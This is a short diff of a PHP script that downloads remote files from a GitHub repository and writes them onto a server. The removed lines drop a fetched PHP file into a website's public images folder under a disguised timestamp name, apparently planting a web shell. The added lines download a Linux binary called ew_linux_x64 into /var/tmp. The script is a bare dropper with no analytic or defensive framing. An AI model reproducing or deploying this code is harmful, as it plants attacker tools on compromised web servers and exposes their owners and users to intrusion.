@@ -1,5 +1,5 @@
 <?php
 //https://github.com/zzqwq555/t1/raw/master/help.zip
 //https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php
-$code=file_get_contents('https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php');
-file_put_contents('/home/home/mco/basiclaw/public_html/images/activity/20181102162400015236.php',$code);
+$code=file_get_contents('https://github.com/zzqwq555/t1/raw/master/ew_linux_x64');
+file_put_contents('/var/tmp/ew_linux_x64',$code);
